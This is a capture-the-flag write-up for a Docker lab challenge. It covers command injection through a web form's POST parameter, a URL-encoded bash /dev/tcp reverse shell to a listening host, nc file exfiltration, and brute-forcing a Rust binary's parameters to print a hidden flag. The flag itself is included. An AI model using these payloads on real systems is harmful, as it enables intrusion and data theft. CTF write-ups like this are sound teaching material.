## Getting started

```bash
$ docker compose up
```

## Evaluation

The host has a webserver open on 8080.

## Website

We can execute commands with the following POST parameters to index.

```
number=124|echo $(id)&format=hex
```

We can use this to get a reverse shell like this (replace 172.17.0.1 with your IP):
```
number=10%20%7Cbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F9001%200%3E%261%27%3Becho%20A&format=hex
```

This executes `sh -i >& /dev/tcp/172.17.0.1/9001 0>&1` on the target (url
encoded).

Before making the request, listen for a reverse shell

```
$ nc -lnvp 9001 # on host
```

## Foothold

We may use the following to stabilize our reverse shell a bit

```bash
# on target
python -c "import pty; pty.spawn('/bin/bash')" # OR
python3 -c "import pty; pty.spawn('/bin/bash')"

# background with <C-z>

stty raw -echo && fg
export TERM=xterm-256-color
```

Now, we can explore a bit. We see that we are logged in as `dave`, not `root` or
`www-data`. In `/home/dave` there are many files, including some PDF files,
a `notes.txt`, and some binaries in `/home/dave/.local/bin`.

The notes.txt file contains a hint that the user has hidden a "password" in an
program. The file also mentions that he made a little program that calculates
time. Indeed, we find such a program in `/home/dave/.local/bin/`.

```bash
dave@25675c48a0e8:~$ /home/dave/.local/bin/timars
Required option 'from' missing
Usage: /home/dave/.local/bin/timars FILE [options]

Options:
    -f, --from HH:MM    calculate time starting from this time
    -t, --to HH:MM      calculate time until this time
    -p, --pause HH:MM   remove this much time from the result
    -h, --help          print this help menu
```

The help menu of the program does not explain too much and has a wrong usage
section, but it's clear that it is made to calculate time differences.

```bash
dave@25675c48a0e8:~$ /home/dave/.local/bin/timars -f 09:00 -t 15:30 -p 0:25
from            : 09:00
to              : 15:30
pause           : 00:25
difference      : 06:05
```

The "password" must be hidden somewhere in that program.

Since this is a docker container that only exposes port 80, which already has
the web application running, we need to be a bit more creative to download the
files. We cannot simply do `python3 -m http.server 81`, since other ports are
not accessible. Since we do not have `root` access, we cannot install other
software like `ssh` or `curl`.

However, we can do something similar to how we got the reverse shell:

```bash
nc -lnvp 9002 > notes.txt # on host
cat notes.txt > /dev/tcp/172.17.0.1/9002

nc -lnvp 9002 > timars # on host
cat timars > /dev/tcp/172.17.0.1/9002
```

## Analyzing timars

Since the notes mentioned that there is a password there, we could try using
`strings` to see if there are any flag/password like strings. The file contains
a lot of strings, but none of them will be the passowrd, since that string is
obfuscated.

Instead, we might try to analyze this binary with a reverse engineering tool
like cutter. Since Rust (crab) binaries are almost always statically linked,
the tool finds a lot of functions and it is not clear which does what. The
ghidra decompiler decompiles code as C, which is not very intuitive. The binary
is stripped and compiled in release mode.

For me, the Rust binary is rather indecipherable. Instead, I opt for
bruteforcing the parameters of the executable. Since we have 6 parameters to
bruteforce, this involves O(x^6) complexity:

```python
for cth in range(23):
    for ctm in range(59):
        for cfh in range(23):
            for cfm in range(59):
                for cph in range(23):
                    for cpm in range(59):
                        exe(cth,ctm,cfh,cfm,cph,cpm)
```

Using parallel processing and a compiled language makes this possible in
a somewhat okay time. However, if we read the source code of the website, we get
a hint:

```python
if form.number.data == "1337":
    output += "\t\n1337 1z my f4v0R173 NUM83R, S0 k3wl"
```

Now, if we fix the pause parameter to 13:37 and bruteforce the other values:

```
cscherr@LP22034 ...rs/timars/challenge % cp ../target/release/bf . && ./bf
to: 01:00 from: 00:00 pause: 13:37 => len: 61
to: 02:00 from: 00:00 pause: 13:37 => len: 61
to: 00:00 from: 00:00 pause: 13:37 => len: 61
to: 08:00 from: 00:00 pause: 13:37 => len: 60
to: 14:00 from: 00:00 pause: 13:37 => len: 60
to: 15:00 from: 00:00 pause: 13:37 => len: 60
to: 11:00 from: 00:00 pause: 13:37 => len: 60
to: 05:00 from: 00:00 pause: 13:37 => len: 60
to: 03:00 from: 00:00 pause: 13:37 => len: 61
to: 17:00 from: 00:00 pause: 13:37 => len: 60
to: 13:00 from: 00:00 pause: 13:37 => len: 60
to: 20:00 from: 00:00 pause: 13:37 => len: 60
to: 06:00 from: 00:00 pause: 13:37 => len: 60
to: 04:00 from: 00:00 pause: 13:37 => len: 61
to: 12:00 from: 00:00 pause: 13:37 => len: 60
to: 18:00 from: 00:00 pause: 13:37 => len: 60

              ./timars -f 00:46 -t 02:00 -p 13:37
              from              : 00:46
to              : 02:00
pause           : 13:37
difference      : -13:37
F~L~Â~G{E1nb38V9a3V5e86HzlY27UFAErIP5mA34kES9fbu}

              ==================
              SOMETHING UNUSUAL!
              LEN: 112


```

The length of the output is significantly different, and the flag (password) is
printed. Challenge solved!

## References

- [Easy Reverse Shells](https://www.revshells.com/)
- [timars repository](https://git.cscherr.de/PlexSheep/timars/src/tag/v0.1.0), contains bruteforce code and code for timars itself
- [repository for this challenge](https://github.com/PlexSheep/dhbw-offsec-pl)
